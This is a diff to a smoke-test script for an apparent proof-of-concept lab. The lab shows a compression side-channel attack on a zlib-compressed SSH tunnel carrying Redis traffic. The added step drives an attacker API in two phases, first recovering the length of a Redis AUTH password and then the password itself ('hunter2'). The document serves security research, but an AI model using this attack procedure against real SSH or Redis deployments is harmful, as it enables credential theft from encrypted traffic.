@@ -1,8 +1,8 @@
-"""End-to-end smoke test for the PoC environment.
+"""End-to-end smoke test for the PoC environment (direct variant).
 
 Run from the host (the docker-compose stack must be up):
 
-    python scripts/verify.py
+    python scripts/verify_direct.py
 
 Checks:
   1. attacker HTTP control API responds
@@ -14,6 +14,9 @@ Checks:
      non-zero TCP segments on the wire
   4. attacker can inject a payload through the Redis tunnel -> same
      observation
+  5. Inject payload through Redis tunnel and capture packet log
+  6. Direct variant: recover hunter2 through /run_attack (two-phase
+     RESP length + password attack)
 """
 
 from __future__ import annotations
@@ -61,6 +64,26 @@ def step(title: str) -> None:
 def fail(msg: str) -> "NoReturn":  # type: ignore[name-defined]
     print(f"FAIL: {msg}")
     sys.exit(1)
+
+
+def _run_attack(variant: str, known_prefix: str, alphabet: str,
+                   max_length: int) -> dict:
+    body = json.dumps({
+        "variant": variant,
+        "config": {
+            "known_prefix": known_prefix,
+            "alphabet": alphabet,
+            "max_length": max_length,
+        },
+    }).encode("utf-8")
+    req = urllib.request.Request(
+        f"{ATTACKER_BASE}/run_attack",
+        method="POST",
+        data=body,
+        headers={"Content-Type": "application/json"},
+    )
+    with urllib.request.urlopen(req, timeout=3600) as resp:
+        return json.loads(resp.read())
 
 
 def main() -> int:
@@ -127,6 +150,36 @@ def main() -> int:
         fail("no TCP segments observed during Redis tunnel injection")
     print("  [ok] attacker observed packets while injecting through Redis tunnel")
 
+    step("6. Direct variant: recover hunter2 through /run_attack")
+    http("POST", f"{CLIENT_BASE}/set_secret",
+         body=json.dumps({"value": "hunter2"}).encode("utf-8"))
+    time.sleep(2.0)
+
+    RESP_PREFIX = "*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$"
+    t0 = time.time()
+    r1 = _run_attack("direct", RESP_PREFIX, "0123456789", 4)
+    if not r1.get("ok"):
+        fail(f"phase 1 failed: {r1}")
+    pw_len = r1["recovered"]
+    print(f"  phase 1: length = {pw_len} ({r1['elapsed_seconds']:.1f}s, "
+          f"{r1['total_guesses']} guesses)")
+
+    r2 = _run_attack(
+        "direct", RESP_PREFIX + pw_len + "\r\n",
+        "abcdefghijklmnopqrstuvwxyz0123456789", int(pw_len) + 4,
+    )
+    if not r2.get("ok"):
+        fail(f"phase 2 failed: {r2}")
+    password = r2["recovered"].rstrip("\r")
+    elapsed = time.time() - t0
+    print(f"  phase 2: password = {password!r} "
+          f"({r2['elapsed_seconds']:.1f}s, {r2['total_guesses']} guesses)")
+    print(f"  Total elapsed: {elapsed:.1f}s  "
+          f"total guesses: {r1['total_guesses'] + r2['total_guesses']}")
+    if password != "hunter2":
+        fail(f"recovered {password!r}, expected 'hunter2'")
+    print("  [ok] hunter2 recovered")
+
     step("VERIFICATION PASSED")
     print("All preconditions are met:")
     print("  (1) SSH connection up with zlib compression")
@@ -134,6 +187,7 @@ def main() -> int:
     print("  (3) Attacker observes encrypted SSH packet sizes on the wire")
     print("  (4) Attacker can trigger Redis AUTH (secret flows c->s)")
     print("  (5) Attacker can inject data through the Redis tunnel (c->s)")
+    print("  (6) Direct variant recovered 'hunter2' end-to-end via /run_attack")
     print("  Both data flows share a single zlib compression context.")
     return 0
 
